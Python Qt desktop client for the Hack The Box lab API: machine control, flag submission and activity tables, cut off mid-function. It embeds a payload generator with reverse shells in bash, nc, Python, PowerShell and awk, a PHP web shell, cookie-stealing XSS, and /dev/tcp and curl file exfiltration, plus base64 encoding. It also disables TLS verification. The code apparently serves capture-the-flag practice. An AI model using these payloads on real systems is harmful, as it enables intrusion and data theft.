import os
import time
import base64
import netifaces
from datetime import datetime, timezone
from urllib.parse import quote, urljoin
from dotenv import load_dotenv
from functools import partial
from html import escape
import json

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QComboBox, QLineEdit, QTextEdit, QFrame,
    QScrollArea, QTableWidget, QTableWidgetItem, QAbstractItemView,
    QHeaderView, QTextBrowser, QGridLayout, QToolButton, QSplitter,
    QMessageBox, QSizePolicy, QStyleFactory
)
from PySide6.QtGui import (
    QFont, QColor, QPalette, QPixmap, QClipboard, QIcon,
    QTextCursor, Qt, QImage, QFontDatabase
)
from PySide6.QtCore import (
    Qt, QTimer, QSize, QThread, Signal, QObject, QByteArray,
    QUrl, QEventLoop, QBuffer
)
from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply
from PySide6.QtNetwork import QNetworkProxy, QSslConfiguration, QSslSocket

load_dotenv()
token = os.getenv("TOKEN")

if not token:
    QMessageBox.critical(None, "Error", "Token not defined in .env file")
    exit()

headers = {
    "Authorization": f"Bearer {token}",
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json, text/plain, */*",
}


list_machines_url = "https://labs.hackthebox.com/api/v4/season/machines"
activate_machine_url = "https://labs.hackthebox.com/api/v4/vm/spawn"
status_machine_url = "https://labs.hackthebox.com/api/v4/machine/profile"
stop_machine_url = "https://labs.hackthebox.com/api/v4/vm/terminate"
submit_flag_url = "https://labs.hackthebox.com/api/v4/machine/own"
reset_machine_url = "https://labs.hackthebox.com/api/v4/vm/reset"
activity_url = "https://labs.hackthebox.com/api/v4/machine/owns/top"


def get_tun0_ip():
    try:
        if "tun0" in netifaces.interfaces():
            addr = netifaces.ifaddresses("tun0").get(netifaces.AF_INET)
            if addr:
                return addr[0]["addr"]
    except Exception as e:
        print(f"Error getting tun0 IP: {e}")
    return "10.10.14.X"


class HTBApiClient(QObject):
    api_error = Signal(str)
    machines_loaded = Signal(list)
    machine_spawned = Signal(dict)
    machine_status = Signal(dict)
    machine_stopped = Signal(dict)
    machine_info_loaded = Signal(dict)
    activity_loaded = Signal(list)
    machine_reset = Signal(dict)
    flag_submitted = Signal(dict)
    flag_activity_loaded = Signal(list)

    def __init__(self, token):
        super().__init__()

        #proxy = QNetworkProxy()
        #proxy.setType(QNetworkProxy.HttpProxy)
        #proxy.setHostName("127.0.0.1")
        #proxy.setPort(8080)

        self.nam = QNetworkAccessManager()
        #self.nam.setProxy(proxy)

        self.ssl_config = QSslConfiguration.defaultConfiguration()
        self.ssl_config.setPeerVerifyMode(QSslSocket.VerifyNone)

        self.base_url = "https://labs.hackthebox.com/api/v4"
        self.headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "HTBCommander/1.0",
            "Accept": "application/json",
        }

    def get_flag_activity(self, machine_id):
        url = QUrl(f"{self.base_url}/machine/activity/{machine_id}")
        request = QNetworkRequest(url)
        self._configure_request(request)

        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_flag_activity(reply))

    def _handle_flag_activity(self, reply):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.flag_activity_loaded.emit(
                    data.get("info", {}).get("activity", []))
            else:
                self.api_error.emit(
                    f"Blood activity error: {reply.errorString()}")
        except Exception as e:
            self.api_error.emit(f"Blood activity parse error: {str(e)}")
        finally:
            reply.deleteLater()

    def reset_machine(self, machine_id):
        url = QUrl(f"{self.base_url}/vm/reset")
        request = QNetworkRequest(url)
        self._configure_request(request)
        request.setHeader(QNetworkRequest.ContentTypeHeader,
                          "application/json")

        payload = {"machine_id": machine_id}
        json_data = json.dumps(payload).encode()

        reply = self.nam.post(request, json_data)
        reply.finished.connect(
            lambda: self._handle_reset_response(reply, machine_id))

    def _handle_reset_response(self, reply, machine_id):
        try:
            response = {
                "success": False,
                "machine_id": machine_id
            }

            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                response.update({
                    "success": True,
                    "message": data.get("message", "Machine reset successfully")
                })
            else:
                response["error"] = reply.errorString()

            self.machine_reset.emit(response)

        except Exception as e:
            self.api_error.emit(f"Reset error: {str(e)}")
        finally:
            reply.deleteLater()

    def _handle_submit_response(self, reply, machine_id):
        try:
            response = {
                "success": False,
                "machine_id": machine_id
            }

            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                response.update({
                    "success": True,
                    "message": data.get("message", "Flag submitted successfully")
                })
            else:
                response["error"] = reply.errorString()

            self.flag_submitted.emit(response)

        except Exception as e:
            self.api_error.emit(f"Submit error: {str(e)}")
        finally:
            reply.deleteLater()

    def submit_flag(self, machine_id, flag):
        url = QUrl(f"{self.base_url}/machine/own")
        request = QNetworkRequest(url)
        self._configure_request(request)
        request.setHeader(QNetworkRequest.ContentTypeHeader,
                          "application/json")

        payload = {
            "machine_id": machine_id,
            "flag": flag
        }
        json_data = json.dumps(payload).encode()

        reply = self.nam.post(request, json_data)
        reply.finished.connect(
            lambda: self._handle_submit_response(reply, machine_id))

    def get_machine_info(self, machine_id):
        url = QUrl(f"{self.base_url}/machine/profile/{machine_id}")
        request = QNetworkRequest(url)
        self._configure_request(request)

        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_machine_info(reply))

    def get_machine_status(self, machine_id):
        url = QUrl(f"{self.base_url}/machine/profile/{machine_id}")
        request = QNetworkRequest(url)
        self._configure_request(request)

        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_status_response(reply))

    def _handle_status_response(self, reply):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.machine_status.emit(data.get("info", {}))
            else:
                self.api_error.emit(f"Status error: {reply.errorString()}")
        except Exception as e:
            self.api_error.emit(f"Status parse error: {str(e)}")
        finally:
            reply.deleteLater()

    def stop_machine(self, machine_id):
        url = QUrl(f"{self.base_url}/vm/terminate")
        request = QNetworkRequest(url)
        self._configure_request(request)
        request.setHeader(QNetworkRequest.ContentTypeHeader,
                          "application/json")

        payload = {"machine_id": machine_id}
        json_data = json.dumps(payload).encode()

        reply = self.nam.post(request, json_data)
        reply.finished.connect(
            lambda: self._handle_stop_response(reply, machine_id))

    def _handle_stop_response(self, reply, machine_id):
        try:
            response = {
                "success": False,
                "machine_id": machine_id
            }

            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                response.update({
                    "success": True,
                    "message": data.get("message", "Machine stopped")
                })
            else:
                response["error"] = reply.errorString()

            self.machine_stopped.emit(response)

        except Exception as e:
            self.api_error.emit(f"Stop error: {str(e)}")
        finally:
            reply.deleteLater()

    def activate_machine(self, machine_id):
        url = QUrl(f"{self.base_url}/vm/spawn")
        request = QNetworkRequest(url)
        request.setHeader(QNetworkRequest.ContentTypeHeader,
                          "application/json")
        self._configure_request(request)

        payload = {"machine_id": machine_id}
        data = QByteArray(json.dumps(payload).encode())

        reply = self.nam.post(request, data)
        reply.finished.connect(
            lambda: self._handle_activate_response(reply, machine_id))

    def _handle_activate_response(self, reply, machine_id):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.machine_spawned.emit({
                    "success": True,
                    "machine_id": machine_id,
                    "message": data.get("message", "Machine spawned successfully")
                })
            else:
                self.machine_spawned.emit({
                    "success": False,
                    "machine_id": machine_id,
                    "message": f"Error: {reply.errorString()}"
                })
        except Exception as e:
            self.machine_spawned.emit({
                "success": False,
                "machine_id": machine_id,
                "message": f"Error parsing response: {str(e)}"
            })
        finally:
            reply.deleteLater()

    def get_machine_activity(self, machine_id):
        url = QUrl(f"{self.base_url}/machine/owns/top/{machine_id}")
        request = QNetworkRequest(url)
        self._configure_request(request)

        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_activity(reply))

    def _handle_activity(self, reply):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.activity_loaded.emit(data.get("info", []))
            else:
                self.api_error.emit(f"Activity error: {reply.errorString()}")
        except Exception as e:
            self.api_error.emit(f"Activity parse error: {str(e)}")
        finally:
            reply.deleteLater()

    def _handle_machine_info(self, reply):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.machine_info_loaded.emit(data.get("info", {}))
            else:
                self.api_error.emit(
                    f"Machine info error: {reply.errorString()}")
        except Exception as e:
            self.api_error.emit(f"Info parse error: {str(e)}")
        finally:
            reply.deleteLater()

    def list_machines(self):
        url = QUrl(f"{self.base_url}/machine/paginated")
        request = QNetworkRequest(url)
        self._configure_request(request)

        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_list_machines(reply))

    def _configure_request(self, request):
        ssl_config = QSslConfiguration.defaultConfiguration()
        ssl_config.setPeerVerifyMode(QSslSocket.VerifyNone)
        request.setSslConfiguration(ssl_config)
        for k, v in self.headers.items():
            request.setRawHeader(k.encode(), v.encode())

    def _handle_list_machines(self, reply):
        try:
            if reply.error() == QNetworkReply.NoError:
                data = json.loads(reply.readAll().data())
                self.machines_loaded.emit(data.get("data", []))
            else:
                self.api_error.emit(
                    f"Error {reply.error()}: {reply.errorString()}")
        except Exception as e:
            self.api_error.emit(f"Error parsing response: {str(e)}")
        finally:
            reply.deleteLater()


class ActivityThread(QThread):
    activity_data = Signal(list)

    def __init__(self, api_client, machine_id):
        super().__init__()
        self.api = api_client
        self.machine_id = machine_id

    def run(self):
        loop = QEventLoop()
        url = QUrl(f"{self.api.base_url}/machine/owns/top/{self.machine_id}")
        request = QNetworkRequest(url)
        self.api._configure_request(request)

        reply = self.api.nam.get(request)
        reply.finished.connect(lambda: loop.quit())
        loop.exec()

        if reply.error() == QNetworkReply.NoError:
            data = json.loads(reply.readAll().data())
            self.activity_data.emit(data.get("info", []))
        reply.deleteLater()


def parse_htb_time(time_str):
    if isinstance(time_str, datetime):
        return time_str.replace(tzinfo=timezone.utc)
    try:
        dt = datetime.strptime(time_str, "%Y-%m-%dT%H:%M:%S.%fZ")
    except ValueError:
        dt = datetime.strptime(time_str, "%Y-%m-%dT%H:%M:%S")
    return dt.replace(tzinfo=timezone.utc)


class NetworkManager(QObject):
    finished = Signal(QByteArray)
    error = Signal(str)

    def __init__(self):
        super().__init__()
        self.nam = QNetworkAccessManager()

    def get(self, url):
        request = QNetworkRequest(QUrl(url))
        reply = self.nam.get(request)
        reply.finished.connect(lambda: self._handle_reply(reply))

    def _handle_reply(self, reply):
        if reply.error() == QNetworkReply.NoError:
            data = reply.readAll()
            self.finished.emit(data)
        else:
            self.error.emit(reply.errorString())
        reply.deleteLater()


class HTBCommander(QMainWindow):
    def __init__(self):
        super().__init__()

        self.api = HTBApiClient(token)
        self.machine_dict = {}
        self.current_machine_id = None
        self.current_machine_data = None
        self.auto_submit_enabled = False
        self.last_flag = ""
        self.animation_timer = None
        
        self._setup_signal_connections()

        self._setup_palette()
        self._setup_ui()

        self._setup_timers()

        self._load_machines()
        self._setup_clipboard_monitor()

        self.status_led.setStyleSheet("color: #ff4444;")

    def _setup_signal_connections(self):
        """Configurar todas las conexiones de señales"""
        self.api.machines_loaded.connect(self._handle_machines_loaded)
        self.api.machine_spawned.connect(self._handle_spawn_result)
        self.api.machine_info_loaded.connect(self._update_status_labels)
        self.api.activity_loaded.connect(self._update_activity_table)
        self.api.machine_stopped.connect(self._handle_stop_result)
        self.api.api_error.connect(self._handle_api_error)
        self.api.machine_reset.connect(self._handle_reset_result)
        self.api.flag_submitted.connect(self._handle_submit_result)
        self.api.flag_activity_loaded.connect(self._update_flag_activity)

    def _setup_timers(self):
        """Configurar todos los timers"""

        QTimer.singleShot(0, self._update_activity)
        QTimer.singleShot(0, self._update_release_timer)

        self.flag_activity_timer = QTimer()
        self.flag_activity_timer.timeout.connect(self._refresh_flag_activity)
        self.flag_activity_timer.start(10000)

        self.status_check_timer = QTimer()
        self.status_check_timer.timeout.connect(self._check_machine_status)
        self.status_check_attempts = 0
        self.max_status_attempts = 30

    def _refresh_flag_activity(self):
        """Actualizar la actividad de flags"""
        if self.current_machine_id:
            self.api.get_flag_activity(self.current_machine_id)

    def _on_machine_selected(self, index):
        """Manejador de selección de máquina"""
        selected = self.machine_combo.currentText()
        if selected and selected in self.machine_dict:
            self.current_machine_id = self.machine_dict[selected]["id"]
            
            # Limpiar datos anteriores
            self._set_default_status()  # <--- Limpiar labels
            self.flag_table.setRowCount(0)  # <--- Limpiar tabla de flags
            self.activity_table.setRowCount(0)  # <--- Limpiar tabla de actividad
            
            # Cargar datos de la nueva máquina
            self.api.get_machine_info(self.current_machine_id)
            self.api.get_machine_activity(self.current_machine_id)
            self._refresh_flag_activity()
            
            # Cargar avatar si existe
            machine_data = self.machine_dict[selected]
            if "avatar_url" in machine_data:
                self._load_avatar(machine_data["avatar_url"])  # <--- Asegúrate de tener este método
            
            self.status_check_attempts = 0

    def closeEvent(self, event):
        """Manejador de cierre de aplicación"""
        if hasattr(self, 'clipboard_timer') and self.clipboard_timer.isActive():
            self.clipboard_timer.stop()
        if self.flag_activity_timer.isActive():
            self.flag_activity_timer.stop()
        if self.status_check_timer.isActive():
            self.status_check_timer.stop()

        super().closeEvent(event)

    def _setup_palette(self):
        palette = self.palette()
        bg_color = QColor("#0f1117")
        panel_bg = QColor("#1e222a")
        text_color = QColor("#e0e0e0")
        accent_color = QColor("#4cc38a")

        palette.setColor(QPalette.Window, bg_color)
        palette.setColor(QPalette.WindowText, text_color)
        palette.setColor(QPalette.Base, panel_bg)
        palette.setColor(QPalette.AlternateBase, bg_color)
        palette.setColor(QPalette.Text, text_color)
        palette.setColor(QPalette.Button, panel_bg)
        palette.setColor(QPalette.ButtonText, text_color)
        palette.setColor(QPalette.HighlightedText, QColor("#e0e0e0"))
        palette.setColor(QPalette.Highlight, QColor("#4cc38a"))
        self.setPalette(palette)

    def _setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        right_panel = QFrame()
        right_panel.setFrameShape(QFrame.StyledPanel)
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(5, 5, 5, 5)

        self._setup_console_activity(right_layout)
        self._setup_machine_info(right_layout)

        left_panel = QFrame()
        left_panel.setFrameShape(QFrame.StyledPanel)
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(5, 5, 5, 5)

        self._setup_machine_control(left_layout)
        self._setup_payload_generator(left_layout)

        main_layout.addWidget(left_panel, 1)
        main_layout.addWidget(right_panel, 2)

    def _setup_machine_control(self, layout):
        frame = QFrame()
        self.machine_combo = QComboBox()
        self.machine_combo.setFont(QFont("Iosevka Nerd Font", 9))

        frame_layout = QVBoxLayout(frame)

        title = QLabel("Machines Control")
        title.setFont(QFont("Iosevka Nerd Font", 10, QFont.Bold))
        frame_layout.addWidget(title)

        frame_layout.addWidget(self.machine_combo)
        btn_layout = QHBoxLayout()
        controls = ["⟳ Refresh", "▶ Spawn", "⏹ Stop", "🔄 Reset"]
        for text in controls:
            btn = QPushButton(text)
            btn.setFont(QFont("Iosevka Nerd Font", 9))
            btn.setCursor(Qt.PointingHandCursor)
            btn.clicked.connect(partial(self._handle_machine_action, text))
            btn_layout.addWidget(btn)
        frame_layout.addLayout(btn_layout)

        auto_frame = QFrame()
        auto_layout = QHBoxLayout(auto_frame)
        self.status_led = QLabel("●")
        self.status_led.setFont(QFont("Arial", 14))

        self.status_led.setStyleSheet("color: #ff4444;")
        auto_layout.addWidget(self.status_led)

        auto_btn = QPushButton("Auto-Submit Flag")
        auto_btn.setFont(QFont("Iosevka Nerd Font", 9))
        auto_btn.clicked.connect(self._toggle_auto_submit)
        auto_layout.addWidget(auto_btn)
        frame_layout.addWidget(auto_frame)
        self.machine_combo.currentIndexChanged.connect(self._on_machine_selected)
        layout.addWidget(frame)

    def _setup_payload_generator(self, layout):
        frame = QFrame()
        frame_layout = QVBoxLayout(frame)

        title = QLabel("Payload Generator")
        title.setFont(QFont("Iosevka Nerd Font", 10, QFont.Bold))
        frame_layout.addWidget(title)

        self.payload_category = QComboBox()
        self.payload_name = QComboBox()
        self.encoding_combo = QComboBox()
        self.payload_ip = QLineEdit()
        self.payload_port = QLineEdit()

        self.payloads = {
            "Reverse Shells": {
                "bash": 'setsid /bin/bash -c "/bin/bash &>/dev/tcp/{IP}/{PORT} 0>&1"',
                "nc": "nc -e /bin/sh {IP} {PORT}",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
                "powershell": """$XD=New-Object Net.Sockets.TCPClient('{IP}', {PORT});$XDD=$XD.GetStream();$XDDDDD=New-Object IO.StreamWriter($XDD);function WriteToStream ($XDDDDDD) { [byte[]]$script:Buffer=0..$XD.ReceiveBufferSize | ForEach-Object {0};$XDDDDD.Write($XDDDDDD + (Get-Location).Path.ToString() + '> ');$XDDDDD.Flush() };WriteToStream '';while(($XDDD=$XDD.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command=([text.encoding]::UTF8).GetString($Buffer, 0, $XDDD - 1);$XDDDD=try { Invoke-Expression "$Command 2>&1" | Out-String } catch { $_ | Out-String }; WriteToStream ($XDDDD) }; $XDDDDD.Close()""",
                "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
                "Awk": """awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
            },
            "TTY": {
                "bash": """if command -v python3; then
    python3 -c "import pty; pty.spawn(['/bin/bash', '-i'])"
elif command -v python2; then
    python2 -c "import pty; pty.spawn(['/bin/bash', '-i'])"
elif command -v script; then
    script -q /dev/null -c /bin/bash"""
            },
            "Miscellaneous": {
                "php system": "<?php system($_REQUEST['cmd']); ?>",
                "php system rev-bash": """<?php system('setsid /bin/bash -c \"/bin/bash &>/dev/tcp/{IP}/{PORT} 0>&1\"'); ?>""",
                "XSS steal cookie": '<img src="x" onerror="this.src=\'http://{IP}:{PORT}/?c=\'+btoa(document.cookie)">',
                "XSS steal page content": "<script>fetch('https//{IP}:{PORT}/?d='+btoa(document.body.innerHTML))</script>"
            },
            "File Transfer": {
                "bash Send": "cat file.txt > /dev/tcp/{IP}/{PORT}",
                "Receive": "nc -lnvp {PORT} > file.txt",
                "uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload"
            }
        }

        self.payload_category.addItems(self.payloads.keys())
        self.payload_category.currentIndexChanged.connect(
            self._update_payload_list)

        self.encoding_combo.addItems(
            ["None", "Base64", "URL Encode", "Base64 utf-16le"])
        self.payload_ip.setText(get_tun0_ip())
        self.payload_port.setText("1337")

        form_items = [
            ("Category:", self.payload_category),
            ("Type:", self.payload_name),
            ("Encoding:", self.encoding_combo),
            ("IP Address:", self.payload_ip),
            ("Port:", self.payload_port),
        ]

        for label, widget in form_items:
            row = QHBoxLayout()
            lbl = QLabel(label)
            lbl.setFont(QFont("Iosevka Nerd Font", 9))
            row.addWidget(lbl)
            row.addWidget(widget)
            frame_layout.addLayout(row)

        self.payload_name.currentIndexChanged.connect(self._generate_payload)
        self.payload_ip.textChanged.connect(self._generate_payload)
        self.payload_port.textChanged.connect(self._generate_payload)
        self.encoding_combo.currentIndexChanged.connect(self._generate_payload)

        preview_label = QLabel("Preview:")
        preview_label.setFont(QFont("Iosevka Nerd Font", 9, QFont.Bold))
        frame_layout.addWidget(preview_label)

        self.payload_text = QTextEdit()
        self.payload_text.setFont(QFont("Consolas", 9))
        self.payload_text.setReadOnly(True)
        frame_layout.addWidget(self.payload_text)

        copy_btn = QPushButton("📋 Copy Payload")
        copy_btn.setFont(QFont("Iosevka Nerd Font", 9))
        copy_btn.clicked.connect(self._copy_payload)
        frame_layout.addWidget(copy_btn)

        self._update_payload_list()
        layout.addSpacing(15)
        layout.addWidget(frame)
        self._setup_flag_activity(layout)

    def _setup_flag_activity(self, layout):
        frame = QFrame()
        frame.setFrameShape(QFrame.StyledPanel)
        frame.setStyleSheet("""
            QFrame {
                background-color: #1e222a;
                border-radius: 5px;
                padding: 5px;
            }
            QLabel {
                color: #e0e0e0;
            }
        """)

        frame_layout = QVBoxLayout(frame)
        frame_layout.setContentsMargins(5, 5, 5, 5)

        title = QLabel("📑 Recent Flag Submissions")
        title.setFont(QFont("Iosevka Nerd Font", 10, QFont.Bold))
        title.setStyleSheet("color: #e0e0e0; margin-bottom: 8px;")
        frame_layout.addWidget(title)

        self.flag_table = QTableWidget()
        self.flag_table.setColumnCount(3)
        self.flag_table.setHorizontalHeaderLabels(["USER", "TYPE", "TIME"])
        self.flag_table.verticalHeader().setVisible(False)
        self.flag_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.flag_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.flag_table.setShowGrid(False)
        self.flag_table.setStyleSheet("""
            QTableWidget {
                background-color: #1e222a;
                border: none;
                font-size: 12px;
                color: #e0e0e0;
            }
            QHeaderView::section {
                background-color: #0f1117;
                padding: 5px;
                border: none;
                font-weight: bold;
                color: #e0e0e0;
            }
            QTableWidget::item {
                padding: 5px;
                color: #e0e0e0;
            }
            /* Scrollbar Vertical */
            QScrollBar:vertical {
                background: #1e222a;
                width: 10px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #2a2e36;
                min-height: 20px;
                border-radius: 5px;
            }
            QScrollBar::handle:vertical:hover {
                background: #4cc38a;
            }
            QScrollBar::add-line:vertical,
            QScrollBar::sub-line:vertical {
                border: none;
                background: none;
            }
            /* Scrollbar Horizontal */
            QScrollBar:horizontal {
                background: #1e222a;
                height: 10px;
                margin: 0px;
            }
            QScrollBar::handle:horizontal {
                background: #2a2e36;
                min-width: 20px;
                border-radius: 5px;
            }
            QScrollBar::handle:horizontal:hover {
                background: #4cc38a;
            }
            QScrollBar::add-line:horizontal,
            QScrollBar::sub-line:horizontal {
                border: none;
                background: none;
            }
        """)

        self.flag_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.flag_table.horizontalHeader().setSectionResizeMode(
            1, QHeaderView.ResizeToContents)
        self.flag_table.horizontalHeader().setSectionResizeMode(
            2, QHeaderView.ResizeToContents)

        frame_layout.addWidget(self.flag_table)
        layout.addWidget(frame)

    def _update_flag_activity(self, activity_data):

        blood_entries = []
        regular_entries = []

        for entry in activity_data:
            if entry.get("type") == "blood":
                blood_entries.append(entry)
            else:
                regular_entries.append(entry)

        def sort_by_date(entry):
            try:
                return datetime.strptime(entry.get("created_at", ""), "%Y-%m-%dT%H:%M:%S.%fZ")
            except:
                return datetime.min

        regular_entries.sort(key=sort_by_date, reverse=True)

        sorted_data = regular_entries + blood_entries

        self.flag_table.setRowCount(len(sorted_data))

        for row, entry in enumerate(sorted_data):

            flag_type = entry.get("type", "user").capitalize()
            if flag_type == "Blood":
                flag_type = "🩸User" if entry.get(
                    "blood_type") == "user" else "🩸Root"

            raw_date = entry.get("created_at", "")
            try:
                date_obj = datetime.strptime(raw_date, "%Y-%m-%dT%H:%M:%S.%fZ")
                formatted_date = date_obj.strftime("%d/%m %H:%M")
            except:
                formatted_date = "N/A"

            username = entry.get("user_name", "Unknown")[:15] + "..." if len(
                entry.get("user_name", "")) > 15 else entry.get("user_name", "Unknown")

            user_item = QTableWidgetItem(username)
            type_item = QTableWidgetItem(flag_type)
            time_item = QTableWidgetItem(formatted_date)

            for item in [user_item, type_item, time_item]:
                item.setForeground(QColor("#e0e0e0"))
                item.setFont(QFont("Iosevka Nerd Font", 11))
                item.setTextAlignment(Qt.AlignCenter)
                item.setFlags(item.flags() ^ Qt.ItemIsEditable)

            self.flag_table.setItem(row, 0, user_item)
            self.flag_table.setItem(row, 1, type_item)
            self.flag_table.setItem(row, 2, time_item)

    def _create_table_item(self, text, color="#e0e0e0", alignment=Qt.AlignCenter, bold=False, font_size=12):
        item = QTableWidgetItem(str(text))
        item.setTextAlignment(alignment)
        item.setForeground(QColor(color))

        font = QFont("Iosevka Nerd Font", font_size)
        font.setBold(bold)
        item.setFont(font)

        item.setFlags(item.flags() ^ Qt.ItemIsEditable)
        return item

    def _handle_reset_result(self, response):
        if response["success"]:
            self._log_to_console("Machine successfully restarted")
            self._check_status()
        else:
            self._log_to_console(
                f"Error when restarting: {response.get('error', 'Unknown error')}", error=True)

    def _handle_submit_result(self, response):
        if response["success"]:
            self._log_to_console("Flag accepted!")
            self.flag_entry.clear()
        else:
            self._log_to_console(
                f"Error en flag: {response.get('error', 'Unknown error')}", error=True)

    def _setup_machine_info(self, layout):
        frame = QFrame()
        grid = QGridLayout(frame)

        self.status_labels = {}
        fields = [
            ("Machine Name:", "name", 0),
            ("IP Address:", "ip", 1),
            ("Type:", "type", 2),
            ("Release:", "expires_at", 3),
        ]

        for label, key, row in fields:
            lbl = QLabel(label)
            lbl.setFont(QFont("Iosevka Nerd Font", 9, QFont.Bold))
            value = QLabel("N/A")
            value.setFont(QFont("Iosevka Nerd Font", 9))
            value.setStyleSheet("color: #4cc38a;")
            grid.addWidget(lbl, row, 0)
            grid.addWidget(value, row, 1)
            self.status_labels[key] = value

        avatar_layout = QVBoxLayout()
        avatar_layout.setSpacing(10)
        avatar_layout.setAlignment(Qt.AlignCenter)

        self.avatar_label = QLabel()
        self.avatar_label.setFixedSize(80, 80)
        self.avatar_label.setAlignment(Qt.AlignCenter)
        avatar_layout.addWidget(self.avatar_label)

        self.copy_ip_btn = QPushButton("📋 Copiar IP")
        self.copy_ip_btn.setIconSize(QSize(20, 20))
        self.copy_ip_btn.setFixedWidth(120)
        self.copy_ip_btn.clicked.connect(self._copy_ip)
        self.copy_ip_btn.setEnabled(False)
        avatar_layout.addWidget(self.copy_ip_btn, 0, Qt.AlignCenter)

        grid.addLayout(avatar_layout, 0, 2, 4, 1)

        flag_frame = QFrame()
        flag_layout = QHBoxLayout(flag_frame)
        self.flag_entry = QLineEdit()
        submit_btn = QPushButton("🚩 Submit")
        submit_btn.clicked.connect(self._submit_flag)
        flag_layout.addWidget(self.flag_entry)
        flag_layout.addWidget(submit_btn)
        grid.addWidget(flag_frame, 4, 0, 1, 3)

        layout.addWidget(frame)

    def _setup_console_activity(self, layout):
        splitter = QSplitter(Qt.Vertical)

        self.activity_table = QTableWidget()
        self.activity_table.setStyleSheet("""
            QTableWidget {
                background-color: #1e222a;
                color: #e0e0e0;
                border: none;
                font-size: 12px;
            }
            QHeaderView::section {
                background-color: #0f1117;
                color: #e0e0e0;  /* Cambiado de #4cc38a a blanco */
                padding: 8px;
                border: none;
                font-weight: bold;
                font-family: "Iosevka Nerd Font";
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:hover {
                background-color: #2a2e36;
            }
            /* Scrollbar styles igual que en la nueva tabla */
            QScrollBar:vertical {
                background: #1e222a;
                width: 10px;
            }
            QScrollBar::handle:vertical {
                background: #2a2e36;
                min-height: 20px;
                border-radius: 5px;
            }
            QScrollBar::add-line:vertical,
            QScrollBar::sub-line:vertical {
                background: none;
            }
        """)

        self.activity_table.verticalHeader().setVisible(False)
        self.activity_table.setColumnCount(6)
        self.activity_table.setHorizontalHeaderLabels(
            ["Pos", "Name", "Rank", "User Time", "Root Time", "Blood"]
        )
        self.activity_table.horizontalHeader().setDefaultAlignment(Qt.AlignCenter)
        self.activity_table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.ResizeToContents)
        self.activity_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.activity_table.horizontalHeader().setSectionResizeMode(
            2, QHeaderView.ResizeToContents)
        self.activity_table.horizontalHeader().setSectionResizeMode(
            3, QHeaderView.ResizeToContents)
        self.activity_table.horizontalHeader().setSectionResizeMode(
            4, QHeaderView.ResizeToContents)
        self.activity_table.horizontalHeader().setSectionResizeMode(
            5, QHeaderView.ResizeToContents)

        self.console = QTextBrowser()
        self.console.setStyleSheet("""
            QTextBrowser {
                background-color: #1e222a;
                color: #e0e0e0;
                border: none;
                font-family: "Iosevka Nerd Font";
                font-size: 12px;
            }
        """)

        splitter.addWidget(self.activity_table)
        splitter.addWidget(self.console)
        splitter.setSizes([300, 100])

        layout.addWidget(splitter)

    def _copy_ip(self):
        ip = self.status_labels["ip"].text()
        if ip not in ["N/A", "null", "", None]:
            clipboard = QApplication.clipboard()
            clipboard.setText(ip)
            self._log_to_console(f"IP copied to clipboard: {ip}")
        else:
            self._log_to_console(
                "No IP available for copying", error=True)

    def _update_payload_list(self):
        category = self.payload_category.currentText()
        if category in self.payloads:
            self.payload_name.clear()
            self.payload_name.addItems(self.payloads[category].keys())
            self._generate_payload()

    def _generate_payload(self):
        try:
            category = self.payload_category.currentText()
            name = self.payload_name.currentText()
            ip = self.payload_ip.text()
            port = self.payload_port.text()

            template = self.payloads[category][name]
            payload = template.replace("{IP}", ip).replace("{PORT}", port)

            encoding = self.encoding_combo.currentText()
            if encoding == "Base64":
                payload = base64.b64encode(payload.encode()).decode()
            elif encoding == "URL Encode":
                payload = quote(payload)
            elif encoding == "Base64 utf-16le":
                payload = base64.b64encode(payload.encode("utf-16le")).decode()

            self.payload_text.setPlainText(payload)
        except Exception as e:
            self._log_to_console(
                f"Error generating payload: {str(e)}", error=True)

    def _stop_machine(self):
        selected = self.machine_combo.currentText()
        if not selected or selected not in self.machine_dict:
